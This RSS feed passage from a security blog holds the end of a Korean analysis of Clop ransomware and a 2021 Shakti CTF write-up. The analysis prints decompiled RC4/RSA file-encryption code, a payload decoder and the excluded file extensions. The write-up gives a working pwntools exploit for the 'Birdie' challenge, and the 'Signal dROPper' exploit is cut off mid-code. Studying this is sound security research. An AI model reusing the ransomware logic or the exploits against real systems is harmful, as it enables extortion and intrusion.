<span class="number">1</span></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result ) // <span class="number">4</span>):</span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x0AE0</span> ^ ROL4(<span class="number">0x0AE0</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,result[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decompress&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompress(decode))</span><br></pre></td></tr></table></figure><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><img src="https://user-images.githubusercontent.com/49066484/119491533-fe0ee600-bd98-11eb-8fec-6f0deddb3060.png" alt="그림11"></p><p>세 번째 단계로 들어왔다. 여기에는 악성코드에서 쓰일법한 함수들이 많이 있는 것으로 보아 실제 악성 행위를 하는 코드가 있을 것이다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119492069-9e650a80-bd99-11eb-8f75-b1a39506e900.png" alt="그림12"></p><p>특정 조건을 만족하면 CreateThread함수를 호출한다. 이 때 Thread가 수행하는 함수는 악성 행위를 할 가능성이 높다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119602027-4542b880-be25-11eb-8f55-fdbe8ea87f94.png" alt="그림15"></p><p><code>WNetOpenEum</code>,<code>WNetEenumResource</code>함수 호출로 현재 연결되어있는 네트워크 정보를 알아온다. 그리고 특정 조건이 만족되면 다시 한 번 CreateThread함수를 호출한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119602538-517b4580-be26-11eb-9501-16d51b87e141.png" alt="그림16"></p><p><code>Crypt</code>로 시작하는 함수들이 보인다. 암호화 관련 코드인 것 같다.  pubKey 문자열을 복사하는데 해당 내용은 아래와 같다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119602903-234a3580-be27-11eb-9b70-5a859c8e043b.png" alt="그림17"></p><ul><li>CryptStringToBinaryA : 포맷된 문자열을 바이트 배열로 변환</li><li>CryptDecodeObjectEx : 변환된 바이트 배열을 구조체 변수로 디코딩</li><li>CryptAcquireContextW :  특정 cryptographic service provider(CSP)에서 원하는 키 컨테이너의 핸들값을 가져옴</li><li>CryptImportPublicKeyInfo : pubkey의 핸들값을 가져옴</li></ul><p>위에서 얻은 Key, 구조체, 핸들 값을 가지고 <code>4014b0()</code>을 호출한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119604958-eaac5b00-be2a-11eb-9b28-20f86fc67822.png" alt="그림18"></p><p><code>4014b0()</code>에서는 암호화할 path를 확인한다. 조건문에서 <code>compare_hash_file</code>의 반환 값에 따라 LABEL_37로 이동한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119605228-5db5d180-be2b-11eb-838a-1f6ad410dbb8.png" alt="그림20"></p><p><code>compare_hash_file</code>함수에서는 특정 hash값과 path에 대한 hash값을 비교하여 return 값을 반환한다. 이 는 모든 Windows의 파일을 암호화하게 된다면 정상적인 작동이 어렵기에 Windows 동작에 필요한 특정 파일들을 암호화에서 제외하는 작업이다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119604955-e97b2e00-be2a-11eb-9daa-ee03a1ad117b.png" alt="그림19"></p><p>LABLE_37은 <code>4014b0</code>을 다시 호출하는 것을 확인 할 수 있는데 이는 해당 path의 하위 폴더를 대상으로 재귀적인 호출을 통해 암호화에서 제외하는 작업으로 판단된다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119605813-60fd8d00-be2c-11eb-8d12-0acaac89757a.png" alt="그림21"></p><p>그러고 나서 조건문을 만나는데, 파일 속성이 디렉토리가 아닐 경우, 파일이름이 <code>..</code> , <code>.</code> 가 아닐 경우, 파일 이름이 <code>README_README.txt</code>가 아닐 경우와 추가적으로</p><p><img src="https://user-images.githubusercontent.com/49066484/119606160-01ec4800-be2d-11eb-8c41-ee6a79062579.png" alt="그림22"></p><p>특정 파일의 hash값과 일치 하지 않을 경우 (특정 파일이 아닌경우)</p><p><img src="https://user-images.githubusercontent.com/49066484/119606165-0284de80-be2d-11eb-89a0-fc5b10cfe1b8.png" alt="그림23"></p><p>파일의 확장자가 특정 값이 아닐 경우 (특정 확장자가 아닌경우)에 조건문을 실행하게 된다.<br>여기서 제외되는 확장자는 아래와 같다.</p><pre><code>- .CI0P : 과거 암호화 파일 확장자- .OCX : ActiveX 파일- .DLL : 동적 라이브러리- .EXE : 실행 파일- .SYS : 드라이버 파일- .LNK : 바로가기 파일- .ICO : 아이콘 파일- .INI : 설정파일- .MSI : Installer 파일- .CHM : 도움말 파일- .HLF- .LNG : 언어팩 파일- .TTF : 폰트 파일- .CMD : 배치 파일- .BAT : 배치 파일- .CLLP : 현재 랜섬웨어 암호화 파일</code></pre><p><img src="https://user-images.githubusercontent.com/49066484/119606505-abcbd480-be2d-11eb-8b1d-0f1463e21523.png" alt="그림24"></p><p>조건을 만족하게 되면 앞에서 받아온 암호화 관련 key, 구조체, 핸들값들을 구조체로 만들고 CreateThread를 호출한다. 이 구조체는 CreateThread의 실행 함수의 인자로 쓰이며 해당 함수는 <code>파일을 암호화하는 함수</code>이다.</p><p>파일을 암호화 할 때 파일 크기가 17000보다 작으면, 암호화를 진행하지 않는다.</p><p>파일 크기가 17000보다 크다면,  파일 크기에 따라 두 가지 방법으로 나뉜다. </p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( args-&gt;fileSize &gt; <span class="number">2132432</span> )             <span class="comment">// 파일 크기가 2132432보다 클 때 암호화 루틴</span></span><br><span class="line">   &#123;</span><br><span class="line">     v17 = CreateFileMappingW(v3, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">2132432u</span>, <span class="number">0</span>);</span><br><span class="line">     NumberOfBytesRead = (DWORD)v17;</span><br><span class="line">     <span class="keyword">if</span> ( !v17 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">     lpBuffer = MapViewOfFile(v17, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0x10000</span>u, <span class="number">0x1F89D0</span>u);<span class="comment">// 파일 내용을 메모리에 맵핑</span></span><br><span class="line">     <span class="keyword">if</span> ( !lpBuffer )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br></pre></td></tr></table></figure><p>파일 크기가 2132432보다 크면 CreateFileMapping함수를 호출하는데 이는 파일 크기가 크기 때문에 open,read,write에 대한 오버헤드 역시 커져 메모리에 맵핑 후 수정하는 방식(MMF)을 사용한 것이다.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v18 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">rc4_key = v18;</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    rc4_key[v20++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">  <span class="keyword">while</span> ( v20 &lt; <span class="number">117</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !*rc4_key &amp;&amp; !rc4_key[<span class="number">1</span>] &amp;&amp; !rc4_key[<span class="number">2</span>] &amp;&amp; !rc4_key[<span class="number">3</span>] &amp;&amp; !rc4_key[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(rc4_key, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">    v2 = v33;</span><br><span class="line">  &#125;</span><br><span class="line">  nNumberOfBytesToRead = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>sbox에서 랜덤으로 값을 가져와 rc4_key를 만든다. 만약 조건을 만족하면 고정된 key를 사용하는데 이는 악성코드 제작자가 사용하기 위한 용도일 것이다.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v21 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( WriteFile(v21, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;nNumberOfBytesToRead, <span class="number">0</span>)</span><br><span class="line">  &amp;&amp; (nNumberOfBytesToWrite = <span class="number">0</span>,</span><br><span class="line">      encrypted_key = (BYTE *)VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>),</span><br><span class="line">      v23 = v2-&gt;hKey,</span><br><span class="line">      v28 = (DWORD)encrypted_key,</span><br><span class="line">      encrypt_key(rc4_key, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v23, encrypted_key),</span><br><span class="line">      WriteFile(v21, (LPCVOID)v28, nNumberOfBytesToWrite, &amp;nNumberOfBytesToRead, <span class="number">0</span>))</span><br><span class="line">  &amp;&amp; v28 )</span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">  VirtualFree((LPVOID)v28, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>암호화에 쓰일 rc4_key를 만든 후 암호화 대상 파일의 이름과 같은 이름의 <code>.clip</code>확장자의 파일을 만든다. 그리고 <code>clip^_-</code>문자열과 rc4_key값을 encrypt_key함수를 통해 RSA로 암호화한 후 해당 파일에 적는다.  (rc4_key를 encrpyt하는 과정)</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">      CloseHandle(v21);</span><br><span class="line">    rc4_init((<span class="keyword">int</span>)rc4_key, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">    rc4_encrypt((<span class="keyword">char</span> *)lpBuffer, <span class="number">0x1F89D0</span>u, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">    UnmapViewOfFile(lpBuffer);</span><br><span class="line">    v4 = (<span class="keyword">void</span> (__stdcall *)(HANDLE))CloseHandle;</span><br><span class="line">    CloseHandle((HANDLE)lpBuffer);</span><br><span class="line">    CloseHandle((HANDLE)NumberOfBytesRead);</span><br><span class="line">    v24(rc4_key, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>만든 rc4_key를 가지고 <code>rc4_init</code>,<code>rc4_encrypt</code>함수를 호출하여 암호화 대상 파일을 암호화 한다. (파일을 encrypt하는 과정)</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;                                           <span class="comment">// 파일 크기가 2132432 보다 작거나 같을때 암호화 루틴</span></span><br><span class="line">  v6 = args-&gt;fileSize;</span><br><span class="line">  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  SetFilePointer(v3, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  nNumberOfBytesToRead = v6 - <span class="number">0x4000</span>;</span><br><span class="line">  v7 = GlobalAlloc(<span class="number">0x40</span>u, v6 - <span class="number">0x4000</span>);</span><br><span class="line">  v29 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; ReadFile(v5, v7, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure><p>파일 크기가 2132432보다 작으면 메모리 mapping 방식이 아닌 read,write 방식을 사용하고, 나머지 encrypt 방식은 위와 동일하다.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v8 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">  rc4_key_ = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      rc4_key_[v10++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v10 &lt; <span class="number">117</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !*rc4_key_ &amp;&amp; !rc4_key_[<span class="number">1</span>] &amp;&amp; !rc4_key_[<span class="number">2</span>] &amp;&amp; !rc4_key_[<span class="number">3</span>] &amp;&amp; !rc4_key_[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(rc4_key_, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">      v2 = v33;</span><br><span class="line">    &#125;</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    v11 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( WriteFile(v11, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">      v12 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">      v13 = v2-&gt;hKey;</span><br><span class="line">      lpBuffer = v12;</span><br><span class="line">      encrypt_key(rc4_key_, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v13, (BYTE *)v12);</span><br><span class="line">      v14 = (<span class="keyword">void</span> *)lpBuffer;</span><br><span class="line">      <span class="keyword">if</span> ( WriteFile(v11, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          VirtualFree(v14, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      CloseHandle(v11);</span><br><span class="line">    v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">  &#125;</span><br><span class="line">  rc4_init((<span class="keyword">int</span>)rc4_key_, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">  v15 = nNumberOfBytesToRead;</span><br><span class="line">  rc4_encrypt((<span class="keyword">char</span> *)v7, nNumberOfBytesToRead, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">  v16 = hFile;</span><br><span class="line">  SetFilePointer(hFile, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  WriteFile(v16, v29, v15, &amp;v28, <span class="number">0</span>);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F232dfd6a-97dd-45df-b9ef-a609fb657267%2FUntitled.png?table=block&id=4d8ce2e0-0edd-4ccb-988e-4bee344d600f&spaceId=44ba02b7-7ecf-4128-9edf-5ee9c344b1ed&width=2130&userId=e7831838-17fc-4bd5-a7cd-ecea2f88bb55&cache=v2" alt="img"></p><p>encrypt하는 방식은 크기와 무관하지만, 범위는 다르다. 암호화 되는 범위는 위와 같다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119608828-922c8c00-be31-11eb-9473-0c60a4024516.png" alt="그림26"></p><p>파일을 암호화 한 뒤 해당 경로에 <code>README_README.txt</code>의 랜섬노트를 만드는 것을 확인할 수 있다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119608699-585b8580-be31-11eb-8162-11e65de4f6d5.png" alt="그림25"></p><p>위와 같은 방법으로 암호화를 진행하며 <code>encrypt_thread</code> 함수는 여러 함수에서 호출된다. 이는 다양한 path에 대한 파일을 찾는 부분은 여러개지만 암호화에 사용되는 함수는 똑같음을 의미한다.</p><h1 id="Malicious-behavior"><a href="#Malicious-behavior" class="headerlink" title="Malicious behavior"></a>Malicious behavior</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><ol><li>악성코드 유포</li><li>악성코드 자가 삭제 batch 파일 생성, 루프 돌면서 끝날 때까지 체크</li><li>WinCheckDRVs 서비스로 악성코드 등록</li><li>모든 드라이브를 돌면서 암호화 대상 파일을 체크 및 암호화</li><li>암호화된 파일 경로에 암호화에 쓰인 rc4_key값을 rsa로 암호화 한 내용을 저장(.clip)</li><li>암호화된 파일 경로에 랜섬노트 생성</li></ol><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p><img src="https://t1.daumcdn.net/cfile/tistory/99129C365FFC135619?original" alt="img"></p><h1 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h1><p><img src="https://user-images.githubusercontent.com/49066484/119609368-6c53b700-be32-11eb-8e1b-d9f599f36a51.png" alt="KakaoTalk_20210522_195528233"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=%ED%8B%B0%EC%98%A4%EB%A6%AC%ED%8B%B0%EB%B9%84TheoriTV">https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=티오리티비TheoriTV</a></li><li><a href="https://wogh8732.tistory.com/363?category=828183">https://wogh8732.tistory.com/363?category=828183</a></li><li><a href="https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26">https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Clop/">Clop</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Ransomware/">Ransomware</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 Shakti CTF</title>
      <link>https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/</guid>
      <pubDate>Sun, 04 Apr 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 Shakti CTF Write-up &lt;/center&gt;

&lt;h1 id=&quot;Birdie-pwnable&quot;&gt;&lt;a href=&quot;#Birdie-pwnable&quot; class=&quot;headerlink&quot; title=&quot;Birdie (pwnable)&quot;&gt;&lt;/a&gt;Birdie (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png&quot; alt=&quot;CTF1&quot;&gt;&lt;/p&gt;
&lt;p&gt;First, Check the protection. It is easy to find binary address because of NoPIE.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 Shakti CTF Write-up </center><h1 id="Birdie-pwnable"><a href="#Birdie-pwnable" class="headerlink" title="Birdie (pwnable)"></a>Birdie (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png" alt="CTF1"></p><p>First, Check the protection. It is easy to find binary address because of NoPIE.</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/49066484/113524421-8bc82380-95e9-11eb-86b9-8077212d2a11.png" alt="CTF2"></p><p>When i analyzed it on IDA, i found that there are two vulnerabilities. The first one is <code>Format String Bug</code> on line 11. And the other is <code>Buffer Overflow</code> on line 13. </p><p><img src="https://user-images.githubusercontent.com/49066484/113524509-17da4b00-95ea-11eb-8226-4d163a6971c1.png" alt="CTF3"></p><p>So i could leak canary and libc addr using <code>Format String Bug</code>. And i could get <code>oneshot</code> because i knew the  libc address. </p><p>Let’s get the shell.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 1111)</span></span><br><span class="line">p = process(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007e2</span></span><br><span class="line">system = e.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x004008f3</span></span><br><span class="line">prsi = <span class="number">0x004008f1</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;name\n&#x27;</span>,<span class="string">&#x27;%15$p::%17$p::&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">libcbase = libc - <span class="number">0x21bf7</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(oneshot)</span><br><span class="line">p.sendafter(<span class="string">&#x27;payload\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Signal-dROPper-pwnable"><a href="#Signal-dROPper-pwnable" class="headerlink" title="Signal dROPper (pwnable)"></a>Signal dROPper (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524624-f7f75700-95ea-11eb-964c-5c42f3c189cd.png" alt="CTF4"></p><p>Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p><p><img src="https://user-images.githubusercontent.com/49066484/113530052-07cd6600-9600-11eb-8ddf-12609a94aa24.png" alt="CTF5"></p><p><code>0x6020c0</code> includes heap address, <code>0x602120</code> includes size of heap. It seems like you can allocate up to 12 buffers but not really. </p><p><img src="https://user-images.githubusercontent.com/49066484/113530229-74e0fb80-9600-11eb-8089-315a30970f31.png" alt="CTF6"></p><p>If i could overwrite read’s size (0x602120[v4]), the buffer overflow. </p><p><img src="https://user-images.githubusercontent.com/49066484/113530470-18321080-9601-11eb-934f-3985f714c59a.png" alt="CTF7"></p><p>So i allocated 13 heaps, then i could overwrite the size part (0x602128). lastly i could write on buffer 0x17c16f0 bytes!</p><p>It only remain to leak the libc addr and overwrite return address using ROP.</p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 